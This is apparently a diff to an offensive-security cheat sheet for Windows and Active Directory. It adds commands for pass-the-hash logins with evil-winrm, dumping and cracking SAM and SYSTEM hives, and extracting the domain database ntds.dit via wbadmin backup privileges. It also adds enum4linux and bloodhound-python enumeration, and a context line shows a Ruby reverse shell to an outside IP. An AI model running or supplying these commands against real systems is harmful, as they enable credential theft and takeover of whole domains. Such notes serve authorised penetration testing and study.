@@ -74,6 +74,8 @@ ruby -rsocket -e 'c=TCPSocket.new("123.123.123.1","4444");while(cmd=c.gets);IO.p
 
 #Alternative for PsRemote is to use evil-winrm
 evil-winrm -i dc.testad.local -u mega-admin -p adminpass
+#You can also login with the NTLM-hash
+evil-winrm -H "123ab4c5678480be63324d1cd53b19ec" -u username -i 10.10.10.10
 
 ----
 
@@ -116,9 +118,20 @@ $pointerSizeInBytes = (4, 8)[[Environment]::Is64BitOperatingSystem]; Write-Host 
 #Always lookout for these: Administrators, Backup Operators, Remote Desktop Users, Remote Management User
 #Remote Desktop Users can leverage RDP
 #Remote Management User can leverage WinRM
-#Backup Operators can operate on files they don't own, or dump HKLM SAM and SYSTEM
+#Backup Operators (SeBackupPrivilege) can operate on files they don't own, or dump HKLM SAM and SYSTEM hives
 reg save hklm\system c:\temp\SYSTEM
 reg save hklm\sam c:\temp\SYSTEM
+#You can "crack" the hives with impacket
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+#Also if you have SeRestorePrivilege, you can dump things, for example the AD database over evil-winrm
+#in this case the dump is done to a public share on another host as the user didn't have write permissions:
+echo y | wbadmin start backup -backuptarget:\\10.0.0.1\Public -include:c:\windows\ntds
+#Then you need the info of which version to restore
+wbadmin get versions
+#Use the Version identifier to restore:
+echo y | wbadmin start recovery -version:02/10/2024-19:10 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
+#Now you can download the ntds.dit from the C root and use impacket in combination with the dumped SYSTEM hive to reveal some secrets:
+impacket-secretsdump -system SYSTEM LOCAL -ntds ntds.dit
 #"Log on as a batch job" user rights enables leveraging scheduled tasks
 #Remember you can elevate with: runas /user:masterAdmin cmd
 
@@ -527,12 +540,17 @@ cat \\dc1.domain.tld\sysvol\domain.tld\Policies\olds\backup_policy.xml
 
 --
 ##Automatic basic enumeration on a Windows host can be conducted with WinPEAS (https://github.com/carlospolop/PEASS-ng)
+##Or on a Linux host with enum4linux
+enum4linux -M -d -a -l -v -u username -p 'password' 10.0.0.111 -w TESTAD.LOCAL
 
 ##Doing the enumeration automatically with for example SharpHound (https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) + BloodHound (https://github.com/BloodHoundAD/BloodHound/tree/master)
 
 #SharpHound to collect data (note that this causes a lot of noise, so would be a miracle not to get caught somewhere):
 Import-Module .\SharpHound.ps1
 Invoke-BloodHound -CollectionMethod All -OutputDirectory c:\users\username\desktop\ -OutputPrefix "ad_dump"
+
+#You can also dump the LDAP info remotely if you have any credentials for the AD, save it as zip, which you can then import to Bloodhound
+bloodhound-python -c All --auth-method ntlm -d testad.local -u 'username@testad.local' -p 'password' -gc testad.local -dc dc01.testad.local -ns 10.0.0.11 --zip -vv
 
 #Import the AD data to your offensive host from the target host, should be located on the user's desktop named something along the lines of:
 #ad_dump_YYYYMMDDHHmmSS.zip
